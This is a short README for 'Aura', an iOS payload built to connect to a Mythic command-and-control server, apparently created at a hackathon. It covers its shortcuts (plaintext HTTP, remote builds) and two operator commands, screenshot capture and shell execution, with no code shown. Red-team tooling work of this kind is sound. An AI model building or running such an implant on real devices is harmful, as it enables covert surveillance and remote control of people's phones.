# Aura iOS Agent

## Description
Aura is an iOS payload designed to interact with a Mythic C2 (command and control) server and was developed over the [2024 Microsoft Global Hackathon](https://microsoft.sharepoint.com/sites/MicrosoftGlobalHackathon2024). To fit within the time constraint of one week:
* The agent communicates over plain text HTTP channels
* Mythic will manage and initate the agent builds per-usual, but the actual compilation and configuration of the agent will take place remotely on macOS w/iOS SDK outside of Docker.
* A limited number of commands will be implemented.

### Requirements
* iOS 12.5.7+

## Operator commands
| Description | Implemented Command |
| - | - |
| Take a screenshot | `take_screenshot` |
| Execute a shell command | `shell_execution [args]` |
